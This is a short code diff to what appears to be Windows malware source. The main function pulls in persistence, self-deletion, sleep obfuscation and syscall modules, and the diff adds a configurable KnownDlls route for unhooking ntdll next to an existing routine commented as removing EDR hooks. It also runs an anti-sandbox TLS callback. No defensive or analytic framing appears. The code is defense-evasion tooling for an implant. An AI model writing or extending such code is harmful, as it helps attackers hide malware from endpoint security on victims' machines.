@@ -17,6 +17,7 @@
 #include "Persist.h"
 #include "Melt.h"
 #include "Unhook.h"
+#include "KnownDlls.h"
 #include "SleepObf.h"
 #include "ApiResolver.h"
 #include "Syscall.h"
@@ -191,10 +192,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // If not, an emulator or sandbox suppressed it.
     TlsCallbackLoader::Init();
 
-    // ── Step 1: Unhook ntdll (Always Active) ──
-    // Remap clean ntdll from disk — removes EDR hooks
-    // Works without admin (own process memory only)
-    Unhook::RefreshNtdll();
+    // ── Step 1: Unhook ntdll ──
+    if (GlobalConfig.bKnownDllsUnhook) {
+        KnownDlls::UnhookNtdll();
+    } else {
+        Unhook::RefreshNtdll();
+    }
 
     // ── Step 1b: Initialize Direct Syscalls ──
     if (GlobalConfig.bIndirectSyscalls)
